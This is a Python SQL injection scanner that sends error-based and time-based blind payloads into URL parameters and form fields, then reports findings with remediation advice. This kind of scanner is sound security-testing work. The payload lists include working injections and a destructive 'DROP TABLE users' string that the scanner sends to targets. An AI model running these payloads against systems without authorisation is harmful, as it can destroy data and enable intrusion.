import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re

# ── Phase 1: Error-based SQL Injection payloads ───────────────────────────────
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1 UNION SELECT NULL--",
    "' UNION SELECT NULL--",
    "1; DROP TABLE users--",
    "' AND 1=1--",
    "' AND 1=2--",
    "admin'--",
    "1' OR '1'='1' #",
    "' OR 1=1 LIMIT 1--",
]

# ── Phase 2: Time-based Blind SQL Injection payloads ─────────────────────────
# Each tuple: (payload, db_engine_label, expected_delay_seconds)
BLIND_SQLI_PAYLOADS = [
    # MySQL
    ("' OR SLEEP(5)--",                                              "MySQL",      5),
    ("1' AND SLEEP(5)--",                                            "MySQL",      5),
    # MSSQL
    ("'; WAITFOR DELAY '0:0:5'--",                                   "MSSQL",      5),
    ("1; WAITFOR DELAY '0:0:5'--",                                   "MSSQL",      5),
    # PostgreSQL
    ("'; SELECT pg_sleep(5)--",                                      "PostgreSQL", 5),
    ("1'; SELECT pg_sleep(5)--",                                     "PostgreSQL", 5),
    # SQLite (CPU-spin trick — heavy LIKE on random blob causes delay)
    ("'; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(150000000))))--","SQLite",     4),
]

# ── Error signatures that indicate error-based SQL injection ──────────────────
SQL_ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    # PostgreSQL
    "pg_query",
    "pg_exec",
    "postgresql",
    "unterminated quoted string",
    # SQLite
    "sqlite3.operationalerror",
    "sqlite_error",
    "unrecognized token",
    # MSSQL
    "microsoft ole db provider for sql server",
    "unclosed quotation mark after the character string",
    "mssql_query",
    "odbc sql server driver",
    # Oracle
    "ora-01756",
    "ora-00933",
    "oracle error",
    "quoted string not properly terminated",
    # Generic
    "sql syntax",
    "sql error",
    "syntax error",
    "database error",
    "query failed",
    "sql command not properly ended",
    "invalid query",
]

# Timeout for blind payloads — long enough to detect delay, short enough to not hang
BLIND_TIMEOUT = 10


class SQLiScanner:
    """
    Two-phase SQL Injection scanner.

    Phase 1 — Error-Based (fast):
        Injects classic payloads and looks for database error strings in the
        HTTP response body. Completes in under 5 seconds for most targets.

    Phase 2 — Time-Based Blind (thorough):
        Only runs if Phase 1 found nothing.
        Injects time-delay payloads (SLEEP, pg_sleep, WAITFOR DELAY) and
        measures response latency. If response time >= 4.5 s, confirms Blind SQLi.
        Uses a 10-second request timeout so it never hangs indefinitely.
    """

    def __init__(self, session=None, timeout=10):
        self.session = session or requests.Session()
        self.timeout = timeout
        self.vulnerabilities = []

    # ═══════════════════════════════════════════════════════════════════════════
    # URL PARAMETER SCANNING
    # ═══════════════════════════════════════════════════════════════════════════

    def scan_url_params(self, url):
        """Phase 1 + Phase 2 scan on URL query parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        for param_name in params:
            # ── Phase 1: Error-based ─────────────────────────────────────────
            found = self._error_based_url(url, parsed, params, param_name)
            if found:
                return   # Confirmed error-based — skip blind phase for this URL

            # ── Phase 2: Time-based blind ────────────────────────────────────
            found_blind = self._blind_url(url, parsed, params, param_name)
            if found_blind:
                return   # Confirmed blind — skip other parameters for this URL

    def _error_based_url(self, url, parsed, params, param_name):
        """Return True and append finding if error-based SQLi is detected."""
        for payload in SQLI_PAYLOADS:
            try:
                modified = dict(params)
                modified[param_name] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(modified, doseq=True)))

                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                body = response.text.lower()

                for sig in SQL_ERROR_SIGNATURES:
                    if sig in body:
                        self.vulnerabilities.append({
                            'vuln_type':   'SQL Injection',
                            'risk_level':  'High',
                            'url':         url,
                            'description': (
                                f'SQL Injection (Error-Based) found in URL parameter "{param_name}". '
                                f'The application returned a raw database error when injected with a '
                                f'SQL payload, indicating unsanitized input is concatenated into SQL queries.'
                            ),
                            'evidence':    f'Parameter: {param_name} | Payload: {payload} | Error matched: "{sig}"',
                            'solution':    (
                                'Use parameterized queries (prepared statements) instead of '
                                'string concatenation. Apply input validation and use an ORM.'
                            ),
                        })
                        return True  # One finding per URL is enough

            except requests.exceptions.RequestException:
                continue
        return False

    def _blind_url(self, url, parsed, params, param_name):
        """Detect Blind SQLi via response timing on URL parameters."""
        for payload, db_label, expected_delay in BLIND_SQLI_PAYLOADS:
            try:
                modified = dict(params)
                modified[param_name] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(modified, doseq=True)))

                response = self.session.get(
                    test_url,
                    timeout=BLIND_TIMEOUT,
                    verify=False,
                )
                elapsed = response.elapsed.total_seconds()

                if elapsed >= 4.5:
                    self.vulnerabilities.append({
                        'vuln_type':   'SQL Injection (Blind/Time-Based)',
                        'risk_level':  'High',
                        'url':         url,
                        'description': (
                            f'Blind SQL Injection (Time-Based) detected in URL parameter "{param_name}". '
                            f'A time-delay payload targeting {db_label} caused the server to pause for '
                            f'{elapsed:.1f}s, confirming that user input is executed inside a SQL query '
                            f'without sanitization. This is exploitable even when no error messages are shown.'
                        ),
                        'evidence':    (
                            f'Parameter: {param_name} | Payload: {payload} | '
                            f'DB Engine: {db_label} | Response delay: {elapsed:.2f}s (threshold: 4.5s)'
                        ),
                        'solution':    (
                            'Use parameterized queries (prepared statements) for all database interactions. '
                            'Never concatenate user input into SQL strings. Apply an ORM layer and validate '
                            'all inputs server-side.'
                        ),
                    })
                    return True  # One blind finding per URL is enough

            except requests.exceptions.Timeout:
                # A timeout on a blind payload is itself suspicious but not definitive
                continue
            except requests.exceptions.RequestException:
                continue
        return False

    # ═══════════════════════════════════════════════════════════════════════════
    # FORM SCANNING
    # ═══════════════════════════════════════════════════════════════════════════

    def scan_form(self, form):
        """Phase 1 + Phase 2 scan on HTML form fields."""
        action_url = form['action']
        method     = form['method']
        inputs     = form['inputs']

        for input_field in inputs:
            # ── Phase 1: Error-based ─────────────────────────────────────────
            found = self._error_based_form(action_url, method, inputs, input_field)
            if found:
                return

            # ── Phase 2: Time-based blind ────────────────────────────────────
            found_blind = self._blind_form(action_url, method, inputs, input_field)
            if found_blind:
                return

    def _error_based_form(self, action_url, method, inputs, input_field):
        """Return True and append finding if error-based SQLi is detected in a form."""
        for payload in SQLI_PAYLOADS[:6]:   # Fewer payloads for forms — keep scan fast
            try:
                data = {
                    inp['name']: (payload if inp['name'] == input_field['name']
                                  else inp.get('value', 'test'))
                    for inp in inputs
                }

                if method == 'post':
                    response = self.session.post(action_url, data=data,
                                                 timeout=self.timeout, verify=False)
                else:
                    response = self.session.get(action_url, params=data,
                                                timeout=self.timeout, verify=False)

                body = response.text.lower()

                for sig in SQL_ERROR_SIGNATURES:
                    if sig in body:
                        self.vulnerabilities.append({
                            'vuln_type':   'SQL Injection',
                            'risk_level':  'High',
                            'url':         action_url,
                            'description': (
                                f'SQL Injection (Error-Based) found in form field "{input_field["name"]}" '
                                f'at {action_url}. The submitted form triggered a database error, '
                                f'suggesting user input is used in SQL queries without sanitization.'
                            ),
                            'evidence':    (
                                f'Form action: {action_url} | Method: {method.upper()} | '
                                f'Field: {input_field["name"]} | Payload: {payload} | '
                                f'Error matched: "{sig}"'
                            ),
                            'solution':    (
                                'Use parameterized queries (prepared statements). '
                                'Sanitize and validate all form inputs on the server side.'
                            ),
                        })
                        return True

            except requests.exceptions.RequestException:
                continue
        return False

    def _blind_form(self, action_url, method, inputs, input_field):
        """Detect Blind SQLi via response timing on form fields."""
        for payload, db_label, expected_delay in BLIND_SQLI_PAYLOADS:
            try:
                data = {
                    inp['name']: (payload if inp['name'] == input_field['name']
                                  else inp.get('value', 'test'))
                    for inp in inputs
                }

                if method == 'post':
                    response = self.session.post(action_url, data=data,
                                                 timeout=BLIND_TIMEOUT, verify=False)
                else:
                    response = self.session.get(action_url, params=data,
                                                timeout=BLIND_TIMEOUT, verify=False)

                elapsed = response.elapsed.total_seconds()

                if elapsed >= 4.5:
                    self.vulnerabilities.append({
                        'vuln_type':   'SQL Injection (Blind/Time-Based)',
                        'risk_level':  'High',
                        'url':         action_url,
                        'description': (
                            f'Blind SQL Injection (Time-Based) detected in form field "{input_field["name"]}" '
                            f'at {action_url}. A time-delay payload targeting {db_label} caused the server '
                            f'to pause for {elapsed:.1f}s, confirming unsanitized SQL query execution.'
                        ),
                        'evidence':    (
                            f'Form action: {action_url} | Method: {method.upper()} | '
                            f'Field: {input_field["name"]} | Payload: {payload} | '
                            f'DB Engine: {db_label} | Response delay: {elapsed:.2f}s (threshold: 4.5s)'
                        ),
                        'solution':    (
                            'Use parameterized queries (prepared statements) for all database interactions. '
                            'Never concatenate user input into SQL strings. Apply an ORM layer and validate '
                            'all inputs server-side.'
                        ),
                    })
                    return True

            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
        return False

    # ═══════════════════════════════════════════════════════════════════════════
    # RESULTS
    # ═══════════════════════════════════════════════════════════════════════════

    def get_results(self):
        """Return deduplicated SQLi findings (error-based + blind combined)."""
        seen = set()
        unique = []
        for v in self.vulnerabilities:
            key = (v['vuln_type'], v['url'], v.get('evidence', '')[:60])
            if key not in seen:
                seen.add(key)
                unique.append(v)
        return unique
